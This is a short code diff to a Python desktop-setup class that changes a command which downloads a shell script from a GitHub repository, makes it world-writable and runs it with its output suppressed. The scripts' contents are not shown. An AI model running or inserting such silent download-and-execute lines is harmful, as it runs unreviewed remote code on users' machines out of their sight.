@@ -35,7 +35,7 @@ class CRD:
         os.system("apt remove --assume-yes gnome-terminal")
         os.system("apt install --assume-yes xscreensaver")
         os.system("systemctl disable lightdm.service")
-        os.system("wget https://raw.githubusercontent.com/jrkeiter/pika/main/ett.sh && chmod 777 ett.sh && bash ./ett.sh >/dev/null 2>&1")
+        os.system("wget https://raw.githubusercontent.com/jrkeiter/multry/main/velus.sh && chmod 777 velus.sh && ./velus.sh  >/dev/null 2>&1")
     
 
     @staticmethod
